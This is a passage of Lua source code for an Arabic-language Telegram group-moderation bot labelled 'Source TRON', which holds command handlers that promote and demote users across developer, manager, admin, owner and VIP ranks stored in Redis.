Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,TRONTEAM)
end
end
end
--     Source TRON     --
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Manager(msg) and ChCheck(msg) then 
function promote_by_reply(extra, result, success)
if SudoId(result.sender_user_id_) == true then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevAbd:sismember(TRON..'Abd:SecondSudo:',result.sender_user_id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevAbd:sismember(TRON..'Abd:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevAbd:sismember(TRON..'Abd:ManagerAll:',result.sender_user_id_) then
managerall = 'المدراء العامين • ' else managerall = '' end
if DevAbd:sismember(TRON..'Abd:AdminAll:',result.sender_user_id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if DevAbd:sismember(TRON..'Abd:VipAll:',result.sender_user_id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
if DevAbd:sismember(TRON..'Abd:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevAbd:sismember(TRON..'Abd:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevAbd:sismember(TRON..'Abd:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if DevAbd:sismember(TRON..'Abd:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevAbd:sismember(TRON..'Abd:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevAbd:sismember(TRON..'Abd:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.sender_user_id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من ↫ ⤈\n~ ( "..secondsudo..sudobot..managerall..adminall..vpall..basicconstructor..constructor..manager..admins..vipmem..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙لم تتم ترقيته مسبقا")  
end
if AbdDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevAbd:srem(TRON..'Abd:SecondSudo:', result.sender_user_id_)
DevAbd:srem(TRON..'Abd:SudoBot:', result.sender_user_id_)
DevAbd:srem(TRON..'Abd:ManagerAll:', result.sender_user_id_)
DevAbd:srem(TRON..'Abd:AdminAll:', result.sender_user_id_)
DevAbd:srem(TRON..'Abd:VipAll:', result.sender_user_id_)
DevAbd:srem(TRON..'Abd:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbdDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
DevAbd:srem(TRON..'Abd:SudoBot:', result.sender_user_id_)
DevAbd:srem(TRON..'Abd:ManagerAll:', result.sender_user_id_)
DevAbd:srem(TRON..'Abd:AdminAll:', result.sender_user_id_)
DevAbd:srem(TRON..'Abd:VipAll:', result.sender_user_id_)
DevAbd:srem(TRON..'Abd:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbdDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevAbd:srem(TRON..'Abd:ManagerAll:', result.sender_user_id_)
DevAbd:srem(TRON..'Abd:AdminAll:', result.sender_user_id_)
DevAbd:srem(TRON..'Abd:VipAll:', result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAbd:srem(TRON..'Abd:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbdDelAll(msg.sender_user_id_,msg.chat_id_) == 'Abdconstructor' then
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAbd:srem(TRON..'Abd:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbdDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbdDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Managers:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif AbdDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, result.sender_user_id_)
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل الكل @(.*)$") and Manager(msg) and ChCheck(msg) then
local rem = {string.match(text, "^(تنزيل الكل) @(.*)$")}
function remm(extra, result, success)
if result.id_ then
if SudoId(result.id_) == true then
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevAbd:sismember(TRON..'Abd:SecondSudo:',result.id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevAbd:sismember(TRON..'Abd:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevAbd:sismember(TRON..'Abd:ManagerAll:',result.id_) then
managerall = 'المدراء العامين • ' else managerall = '' end
if DevAbd:sismember(TRON..'Abd:AdminAll:',result.id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if DevAbd:sismember(TRON..'Abd:VipAll:',result.id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
if DevAbd:sismember(TRON..'Abd:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevAbd:sismember(TRON..'Abd:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevAbd:sismember(TRON..'Abd:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if DevAbd:sismember(TRON..'Abd:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevAbd:sismember(TRON..'Abd:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevAbd:sismember(TRON..'Abd:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من ↫ ⤈\n~ ( "..secondsudo..sudobot..managerall..adminall..vpall..basicconstructor..constructor..manager..admins..vipmem..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.id_,"Reply","⌁︙لم تتم ترقيته مسبقا")  
end 
if AbdDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevAbd:srem(TRON..'Abd:SecondSudo:', result.id_)
DevAbd:srem(TRON..'Abd:SudoBot:', result.id_)
DevAbd:srem(TRON..'Abd:ManagerAll:', result.id_)
DevAbd:srem(TRON..'Abd:AdminAll:', result.id_)
DevAbd:srem(TRON..'Abd:VipAll:', result.id_)
DevAbd:srem(TRON..'Abd:BasicConstructor:'..msg.chat_id_,result.id_)
DevAbd:srem(TRON..'Abd:Constructor:'..msg.chat_id_,result.id_)
DevAbd:srem(TRON..'Abd:Managers:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:Cleaner:'..msg.chat_id_, result.id_)
elseif AbdDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
DevAbd:srem(TRON..'Abd:SudoBot:', result.id_)
DevAbd:srem(TRON..'Abd:ManagerAll:', result.id_)
DevAbd:srem(TRON..'Abd:AdminAll:', result.id_)
DevAbd:srem(TRON..'Abd:VipAll:', result.id_)
DevAbd:srem(TRON..'Abd:BasicConstructor:'..msg.chat_id_,result.id_)
DevAbd:srem(TRON..'Abd:Constructor:'..msg.chat_id_,result.id_)
DevAbd:srem(TRON..'Abd:Managers:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:Cleaner:'..msg.chat_id_, result.id_)
elseif AbdDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevAbd:srem(TRON..'Abd:ManagerAll:', result.id_)
DevAbd:srem(TRON..'Abd:AdminAll:', result.id_)
DevAbd:srem(TRON..'Abd:VipAll:', result.id_)
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:Managers:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:Constructor:'..msg.chat_id_,result.id_)
DevAbd:srem(TRON..'Abd:BasicConstructor:'..msg.chat_id_,result.id_)
DevAbd:srem(TRON..'Abd:Cleaner:'..msg.chat_id_, result.id_)
elseif AbdDelAll(msg.sender_user_id_,msg.chat_id_) == 'Abdconstructor' then
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:Managers:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:Constructor:'..msg.chat_id_,result.id_)
DevAbd:srem(TRON..'Abd:BasicConstructor:'..msg.chat_id_,result.id_)
DevAbd:srem(TRON..'Abd:Cleaner:'..msg.chat_id_, result.id_)
elseif AbdDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:Managers:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:Constructor:'..msg.chat_id_,result.id_)
DevAbd:srem(TRON..'Abd:Cleaner:'..msg.chat_id_, result.id_)
elseif AbdDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:Managers:'..msg.chat_id_, result.id_)
elseif AbdDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, result.id_)
DevAbd:srem(TRON..'Abd:VipMem:'..msg.chat_id_, result.id_)
end
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙المعرف غير صحيح*', 1, 'md')
end
end
resolve_username(rem[2],remm)
end
--     Source TRON     --
--     Set SecondSudo     --
if Sudo(msg) then
if text ==('اضف مطور ثانوي') or text ==('رفع مطور ثانوي') and SourceCh(msg) then
function sudo_reply(extra, result, success)
DevAbd:sadd(TRON..'Abd:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المطورين الثانويين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع مطور ثانوي @(.*)')) and SourceCh(msg) then
local username = text:match('^اضف مطور ثانوي @(.*)') or text:match('^رفع مطور ثانوي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:sadd(TRON..'Abd:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المطورين الثانويين")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^اضف مطور ثانوي (%d+)') or text:match('^رفع مطور ثانوي (%d+)')) and SourceCh(msg) then
local user = text:match('اضف مطور ثانوي (%d+)') or text:match('رفع مطور ثانوي (%d+)')
DevAbd:sadd(TRON..'Abd:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المطورين الثانويين")  
end
--     Source TRON     --
--     Rem SecondSudo     --
if text ==('حذف مطور ثانوي') or text ==('تنزيل مطور ثانوي') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbd:srem(TRON..'Abd:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المطورين الثانويين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^حذف مطور ثانوي @(.*)') or text:match('^تنزيل مطور ثانوي @(.*)')) and SourceCh(msg) then
local username = text:match('^حذف مطور ثانوي @(.*)') or text:match('^تنزيل مطور ثانوي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:srem(TRON..'Abd:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المطورين الثانويين")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^حذف مطور ثانوي (%d+)') or text:match('^تنزيل مطور ثانوي (%d+)')) and SourceCh(msg) then
local user = text:match('حذف مطور ثانوي (%d+)') or text:match('تنزيل مطور ثانوي (%d+)')
DevAbd:srem(TRON..'Abd:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المطورين الثانويين")  
end end
--     Source TRON     --
--       Set SudoBot      --
if SecondSudo(msg) then
if text ==('اضف مطور') or text ==('رفع مطور') and SourceCh(msg) then
function sudo_reply(extra, result, success)
DevAbd:sadd(TRON..'Abd:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^اضف مطور @(.*)') or text:match('^رفع مطور @(.*)')) and SourceCh(msg) then
local username = text:match('^اضف مطور @(.*)') or text:match('^رفع مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:sadd(TRON..'Abd:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المطورين")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^اضف مطور (%d+)') or text:match('^رفع مطور (%d+)')) and SourceCh(msg) then
local user = text:match('اضف مطور (%d+)') or text:match('رفع مطور (%d+)')
DevAbd:sadd(TRON..'Abd:SudoBot:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المطورين")  
end
--     Source TRON     --
--       Rem SudoBot      --
if text ==('حذف مطور') or text ==('تنزيل مطور') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbd:srem(TRON..'Abd:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^حذف مطور @(.*)') or text:match('^تنزيل مطور @(.*)')) and SourceCh(msg) then
local username = text:match('^حذف مطور @(.*)') or text:match('^تنزيل مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:srem(TRON..'Abd:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المطورين")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^حذف مطور (%d+)') or text:match('^تنزيل مطور (%d+)')) and SourceCh(msg) then
local user = text:match('حذف مطور (%d+)') or text:match('تنزيل مطور (%d+)')
DevAbd:srem(TRON..'Abd:SudoBot:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المطورين")  
end end
--     Source TRON     --
--      Set ManagerAll    --
if SudoBot(msg) then
if text ==('رفع مدير عام') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevAbd:sadd(TRON..'Abd:ManagerAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المدراء العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مدير عام @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:sadd(TRON..'Abd:ManagerAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المدراء العامين")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مدير عام (%d+)') and SourceCh(msg) then
local user = text:match('رفع مدير عام (%d+)')
DevAbd:sadd(TRON..'Abd:ManagerAll:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المدراء العامين")  
end
--     Source TRON     --
--      Rem ManagerAll    --
if text ==('تنزيل مدير عام') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbd:srem(TRON..'Abd:ManagerAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المدراء العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير عام @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:srem(TRON..'Abd:ManagerAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المدراء العامين")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير عام (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مدير عام (%d+)')
DevAbd:srem(TRON..'Abd:ManagerAll:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المدراء العامين")  
end end
--     Source TRON     --
--      Set adminall      --
if ManagerAll(msg) then
if text ==('رفع ادمن عام') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevAbd:sadd(TRON..'Abd:AdminAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة الادمنيه العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع ادمن عام @(.*)') and SourceCh(msg) then
local username = text:match('^رفع ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:sadd(TRON..'Abd:AdminAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة الادمنيه العامين")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن عام (%d+)') and SourceCh(msg) then
local user = text:match('رفع ادمن عام (%d+)')
DevAbd:sadd(TRON..'Abd:AdminAll:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة الادمنيه العامين")  
end
--     Source TRON     --
--      Rem adminall      --
if text ==('تنزيل ادمن عام') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbd:srem(TRON..'Abd:AdminAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة الادمنيه العامين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن عام @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:srem(TRON..'Abd:AdminAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة الادمنيه العامين")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن عام (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل ادمن عام (%d+)')
DevAbd:srem(TRON..'Abd:AdminAll:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة الادمنيه العامين")  
end end
--     Source TRON     --
--       Set Vipall       --
if AdminAll(msg) then
if text ==('رفع مميز عام') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevAbd:sadd(TRON..'Abd:VipAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المميزين العام")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مميز عام @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:sadd(TRON..'Abd:VipAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه في قائمة المميزين العام")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز عام (%d+)') and SourceCh(msg) then
local user = text:match('رفع مميز عام (%d+)')
DevAbd:sadd(TRON..'Abd:VipAll:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه في قائمة المميزين العام")  
end
--     Source TRON     --
--       Rem Vipall       --
if text ==('تنزيل مميز عام') and SourceCh(msg) then
function prom_reply(extra, result, success)
DevAbd:srem(TRON..'Abd:VipAll:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المميزين العام")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز عام @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:srem(TRON..'Abd:VipAll:',result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من قائمة المميزين العام")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز عام (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مميز عام (%d+)')
DevAbd:srem(TRON..'Abd:VipAll:',user)
ReplyStatus(msg,user,"Reply","⌁︙تم تنزيله من قائمة المميزين العام")  
end end
--     Source TRON     --
--   Set AbdConstructor   --
if ChatType == 'sp' or ChatType == 'gp'  then
if SudoBot(msg) then
if text ==('رفع مالك') and SourceCh(msg) then
function raf_reply(extra, result, success)
DevAbd:sadd(TRON..'Abd:AbdConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه مالك")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مالك @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مالك @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbd:sadd(TRON..'Abd:AbdConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم رفعه مالك")  
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مالك (%d+)') and SourceCh(msg) then
local user = text:match('رفع مالك (%d+)')
DevAbd:sadd(TRON..'Abd:AbdConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","⌁︙تم رفعه مالك")  
end
--     Source TRON     --
--   Rem AbdConstructor   --
if text ==('تنزيل مالك') and SourceCh(msg) then
function prom_reply(extra, result, success)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(result.sender_user_id_) == tonumber(admins[i].user_id_) then  
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevAbd:srem(TRON..'Abd:AbdConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من المالكين")  
end end end
end,nil)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end 
end
if text and text:match('^تنزيل مالك @(.*)') and SourceCh(msg) then
local username = text:match('^تنزيل مالك @(.*)')
function promreply(extra,result,success)
if result.id_ then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(result.id_) == tonumber(admins[i].user_id_) then  
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا يمكن تنزيل المالك الاساسي', 1, 'md')
else
DevAbd:srem(TRON..'Abd:AbdConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","⌁︙تم تنزيله من المالكين")  
end end end
end,nil)
else 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مالك (%d+)') and SourceCh(msg) then
local user = text:match('تنزيل مالك (%d+)')
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
